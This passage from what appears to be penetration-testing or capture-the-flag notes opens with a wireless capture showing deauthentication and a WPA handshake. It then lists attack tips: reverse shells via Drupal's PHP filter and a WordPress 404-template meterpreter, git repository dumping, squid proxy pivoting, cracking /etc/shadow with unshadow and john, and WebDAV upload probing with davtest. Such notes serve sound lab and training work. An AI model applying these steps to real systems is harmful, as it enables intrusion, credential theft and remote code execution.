<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.924224</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> <span class="nn">nonassociated</span> <span class="n">station</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.924736</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> <span class="nn">nonassociated</span> <span class="n">station</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.925723</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.933402</span> <span class="n">Probe</span> <span class="n">Response</span> <span class="p">(</span><span class="n">community</span><span class="p">)</span> <span class="p">[</span><span class="mf">1.0</span><span class="o">*</span> <span class="mf">2.0</span><span class="o">*</span> <span class="mf">5.5</span><span class="o">*</span> <span class="mf">11.0</span><span class="o">*</span> <span class="mf">18.0</span> <span class="mf">24.0</span> <span class="mf">36.0</span> <span class="mf">54.0</span> <span class="n">Mbit</span><span class="p">]</span> <span class="n">CH</span><span class="p">:</span> <span class="mi">11</span><span class="p">,</span> <span class="n">PRIVACY</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.933908</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.934427</span> <span class="n">Clear</span><span class="o">-</span><span class="n">To</span><span class="o">-</span><span class="n">Send</span> <span class="n">RA</span><span class="p">:</span><span class="n">e0</span><span class="p">:</span><span class="mi">3</span><span class="n">e</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.991250</span> <span class="n">Authentication</span> <span class="p">(</span><span class="n">Open</span> <span class="n">System</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span> <span class="n">Successful</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.992274</span> <span class="n">Authentication</span> <span class="p">(</span><span class="n">Open</span> <span class="n">System</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span> <span class="n">Successful</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.992282</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.992795</span> <span class="n">Authentication</span> <span class="p">(</span><span class="n">Open</span> <span class="n">System</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">:</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.992787</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.994834</span> <span class="n">Assoc</span> <span class="n">Request</span> <span class="p">(</span><span class="n">community</span><span class="p">)</span> <span class="p">[</span><span class="mf">1.0</span><span class="o">*</span> <span class="mf">2.0</span><span class="o">*</span> <span class="mf">5.5</span><span class="o">*</span> <span class="mf">11.0</span><span class="o">*</span> <span class="mf">18.0</span> <span class="mf">24.0</span> <span class="mf">36.0</span> <span class="mf">54.0</span> <span class="n">Mbit</span><span class="p">]</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.994843</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.996890</span> <span class="n">Assoc</span> <span class="n">Response</span> <span class="n">AID</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">:</span> <span class="n">PRIVACY</span> <span class="p">:</span> <span class="n">Successful</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.996882</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.011783</span> <span class="n">Action</span> <span class="p">(</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">BA</span> <span class="n">ADDBA</span> <span class="n">Response</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.012314</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.012827</span> <span class="n">BAR</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span> <span class="n">TA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span> <span class="n">CTL</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="n">SEQ</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.013330</span> <span class="n">BA</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.014874</span> <span class="n">CF</span> <span class="o">+</span><span class="n">QoS</span> <span class="n">EAPOL</span> <span class="n">key</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">v2</span><span class="p">,</span> <span class="nb">len</span> <span class="mi">117</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.015379</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.030226</span> <span class="n">CF</span> <span class="o">+</span><span class="n">QoS</span> <span class="n">EAPOL</span> <span class="n">key</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">v1</span><span class="p">,</span> <span class="nb">len</span> <span class="mi">117</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.030746</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.043034</span> <span class="n">CF</span> <span class="o">+</span><span class="n">QoS</span> <span class="n">EAPOL</span> <span class="n">key</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">v2</span><span class="p">,</span> <span class="nb">len</span> <span class="mi">175</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.043026</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.054803</span> <span class="n">CF</span> <span class="o">+</span><span class="n">QoS</span> <span class="n">EAPOL</span> <span class="n">key</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">v1</span><span class="p">,</span> <span class="nb">len</span> <span class="mi">95</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.056338</span> <span class="n">CF</span> <span class="o">+</span><span class="n">QoS</span> <span class="n">EAPOL</span> <span class="n">key</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">v1</span><span class="p">,</span> <span class="nb">len</span> <span class="mi">95</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.056859</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.064514</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">9</span><span class="n">c</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="mi">5</span><span class="n">f</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.065030</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">9</span><span class="n">c</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="mi">5</span><span class="n">f</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.079878</span> <span class="n">Clear</span><span class="o">-</span><span class="n">To</span><span class="o">-</span><span class="n">Send</span> <span class="n">RA</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">9</span><span class="n">c</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="mi">5</span><span class="n">f</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.080901</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">9</span><span class="n">c</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="mi">5</span><span class="n">f</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.108096</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> <span class="nn">nonassociated</span> <span class="n">station</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.108096</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> <span class="nn">nonassociated</span> <span class="n">station</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.110144</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> <span class="nn">nonassociated</span> <span class="n">station</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Transfer an image</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">base64</span> <span class="n">flair</span><span class="o">.</span><span class="n">jpg</span>
<span class="n">Copy</span> <span class="n">output</span>
<span class="n">vi</span> <span class="n">flair</span>
<span class="n">Paste</span> <span class="n">the</span> <span class="n">clipboard</span>
<span class="n">base64</span> <span class="o">-</span><span class="n">d</span> <span class="n">flair</span> <span class="o">&gt;</span> <span class="n">flair</span><span class="o">.</span><span class="n">jpg</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Have a web-accessible git ? utilize <a class="reference external" href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a> to rip web accessible (distributed) version control systems: SVN, GIT, Mercurial/hg, bzr. It can rip repositories even when directory browsing is turned off. Eric Gruber has written a blog on <a class="reference external" href="https://blog.netspi.com/dumping-git-data-from-misconfigured-web-servers/">Dumping Git Data from Misconfigured Web Servers</a> providing good walkthru.</p></li>
<li><p>It’s always important to find, what’s installed on the box:</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">dpkg</span><span class="o">-</span><span class="n">query</span> <span class="o">-</span><span class="n">l</span>
</pre></div>
</div>
<p>or using wild cards</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">dpkg</span><span class="o">-</span><span class="n">query</span> <span class="o">-</span><span class="n">l</span> <span class="s1">&#39;perl*&#39;</span>
</pre></div>
</div>
</div></blockquote>
<ul>
<li><p>It’s always important to note down all the passwords found during the process of exploiting a vulnerable machine as there is a great possibility that passwords would be reused.</p></li>
<li><p>If you have .jar file, Probably use jd-gui to decompile and view the class file.</p></li>
<li><p>Find recently modified files:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">mmin</span> <span class="o">-</span><span class="mi">10</span> <span class="o">-</span><span class="nb">type</span> <span class="n">f</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
</pre></div>
</div>
<p>The above will show you which files have been modified within the last 10 minutes, which could help you find out whether an important config file, or log file has been modified.</p>
</li>
<li><p>Getting a reverse shell from:</p></li>
</ul>
<blockquote>
<div><ul>
<li><p>Drupal: Now that we have access to the Drupal administration panel, we can gain RCE by enabling the PHP filter module. This will allow us to execute arbitrary code on the site by inserting a specifically crafted string into page content. After enabling the module, I proceed to allow code to be executed by all users under the configuration screen for the module. Once enabled we need to give permission to use it so in people -&gt; permissions check “Use the PHP code text for.</p>
<p>Next, we create a new block (by going to Blocks, under the Structure menu) with the following content. We make sure to select PHP code from the Text format drop down. Taken from <a class="reference external" href="https://g0blin.co.uk/droopy-vulnhub-writeup/">Droopy Vulnhub WriteUp</a>
Drupal settings file location: /var/www/html/sites/default/settings.php</p>
</li>
<li><p>WordPress : If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible way is to do Appearance &gt; Editor &gt; Possibly edit 404 Template.</p></li>
</ul>
</div></blockquote>
<ul class="simple">
<li><p>If the only port which is open is 3128, check for the open proxy and route the traffic via the open proxy. Probably, squid proxy server would be running. If it is the squid configuration file is /etc/squid/squid.conf</p></li>
</ul>
<blockquote>
<div><ul class="simple">
<li><p>If you do get the configuration file, do check for what kind of proxy it is! like SOCKS4, SOCKS5 or HTTP(S) proxy and is there any authentication required to access the proxy.</p></li>
<li><p>We may utilize <a class="reference external" href="https://github.com/haad/proxychains">Proxychains</a> to access the other side of network like ssh, http etc.</p></li>
</ul>
</div></blockquote>
<ul>
<li><p>Running Asterisk/ Elastix/ FreePBX or any PBX, probably try <a class="reference external" href="https://github.com/EnableSecurity/sipvicious">SIPVicious</a>  suite is a set of tools that can be used to audit SIP based VoIP systems. Running “http:\IPpanel” should provide us valid extensions.</p></li>
<li><p>Sharepoint running? Probably, check <a class="reference external" href="https://github.com/sensepost/SPartan">SPartan</a> Frontpage and Sharepoint fingerprinting and attack tool and <a class="reference external" href="https://github.com/0rigen/SharePwn">SharePwn</a> SharePoint Security Auditor.</p></li>
<li><p>authbind software allows a program that would normally require superuser privileges to access privileged network services to run as a non-privileged user. authbind allows the system administrator to permit specific users and groups access to bind to TCP and UDP ports below 1024.</p></li>
<li><p>Mostly, if there’s only port open like ssh and the IP might be acting as a interface between two networks? Like IT and OT. Probably, try to add that IP address as a default route? As it might be acting as a router?</p></li>
<li><p>If you are trying to figure out the hostname of the machine and the DNS-Server is not configured, may be try to do a Full Nmap Scan -A Option? (Still need to figure out how does that work)</p></li>
<li><p>Want to send a email via the SMTP server something like SMTP-Open-Relay utilize <a class="reference external" href="http://www.jetmore.org/john/code/swaks/">Swaks</a> Swiss Army Knife for SMTP.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">swaks</span> <span class="o">--</span><span class="n">to</span> <span class="n">xxxxx</span><span class="nd">@example</span><span class="o">.</span><span class="n">com</span> <span class="o">--</span><span class="kn">from</span> <span class="nn">xxxxxee</span><span class="nd">@example</span><span class="o">.</span><span class="n">edu</span> <span class="o">--</span><span class="n">server</span> <span class="mf">192.168.110.105</span><span class="p">:</span><span class="mi">2525</span> <span class="o">--</span><span class="n">body</span> <span class="s2">&quot;Hey Buddy How are you doing&quot;</span> <span class="o">--</span><span class="n">header</span> <span class="s2">&quot;Subject: Hello! Long time&quot;</span>
</pre></div>
</div>
</li>
<li><p>Got /etc/shadow file?, utilize /etc/passwd with unshadow command and use john or cudahashcat to crack passwords.</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">unshadow</span> <span class="n">passwd</span> <span class="n">shadown</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>If IIS and WebDav with PUT and MOVE method are enabled, we can use testdav or cadaver (A command-line WebDAV client for Unix) to see which files are allowed</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">davtest</span> <span class="o">-</span><span class="n">url</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span>
<span class="o">********************************************************</span>
 <span class="n">Testing</span> <span class="n">DAV</span> <span class="n">connection</span>
<span class="n">OPEN</span>          <span class="n">SUCCEED</span><span class="p">:</span>                <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span>
<span class="o">********************************************************</span>
<span class="n">NOTE</span>  <span class="n">Random</span> <span class="n">string</span> <span class="k">for</span> <span class="n">this</span> <span class="n">session</span><span class="p">:</span> <span class="n">E3u9ISnNswYes0</span>
<span class="o">********************************************************</span>
 <span class="n">Creating</span> <span class="n">directory</span>
<span class="n">MKCOL</span>         <span class="n">SUCCEED</span><span class="p">:</span>                <span class="n">Created</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span>
<span class="o">********************************************************</span>
 <span class="n">Sending</span> <span class="n">test</span> <span class="n">files</span>
<span class="n">PUT</span>   <span class="n">pl</span>      <span class="n">SUCCEED</span><span class="p">:</span>        <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">pl</span>
<span class="n">PUT</span>   <span class="n">asp</span>     <span class="n">FAIL</span>
<span class="n">PUT</span>   <span class="n">aspx</span>    <span class="n">FAIL</span>
<span class="n">PUT</span>   <span class="n">cgi</span>     <span class="n">FAIL</span>
<span class="n">PUT</span>   <span class="n">html</span>    <span class="n">SUCCEED</span><span class="p">:</span>        <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">html</span>
<span class="n">PUT</span>   <span class="n">cfm</span>     <span class="n">SUCCEED</span><span class="p">:</span>        <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">cfm</span>
<span class="n">PUT</span>   <span class="n">jhtml</span>   <span class="n">SUCCEED</span><span class="p">:</span>        <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">jhtml</span>
<span class="n">PUT</span>   <span class="n">shtml</span>   <span class="n">FAIL</span>
<span class="n">PUT</span>   <span class="n">php</span>     <span class="n">SUCCEED</span><span class="p">:</span>        <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">php</span>
<span class="n">PUT</span>   <span class="n">jsp</span>     <span class="n">SUCCEED</span><span class="p">:</span>        <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">jsp</span>
<span class="n">PUT</span>   <span class="n">txt</span>     <span class="n">SUCCEED</span><span class="p">:</span>        <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">txt</span>
<span class="o">********************************************************</span>
 <span class="n">Checking</span> <span class="k">for</span> <span class="n">test</span> <span class="n">file</span> <span class="n">execution</span>
<span class="n">EXEC</span>  <span class="n">pl</span>      <span class="n">FAIL</span>
<span class="n">EXEC</span>  <span class="n">html</span>    <span class="n">SUCCEED</span><span class="p">:</span>        <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">html</span>
<span class="n">EXEC</span>  <span class="n">cfm</span>     <span class="n">FAIL</span>
<span class="n">EXEC</span>  <span class="n">jhtml</span>   <span class="n">FAIL</span>
<span class="n">EXEC</span>  <span class="n">php</span>     <span class="n">FAIL</span>
<span class="n">EXEC</span>  <span class="n">jsp</span>     <span class="n">FAIL</span>
<span class="n">EXEC</span>  <span class="n">txt</span>     <span class="n">SUCCEED</span><span class="p">:</span>        <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">txt</span>

<span class="o">********************************************************</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">davtest</span> <span class="n">Summary</span><span class="p">:</span>
<span class="n">Created</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span>
<span class="n">PUT</span> <span class="n">File</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.54.98.15</span><span class="o">/</span><span class="n">DavTestDir_E3u9ISnNswYes0</span><span class="o">/</span><span class="n">davtest_E3u9ISnNswYes0</span><span class="o">.</span><span class="n">pl</span>
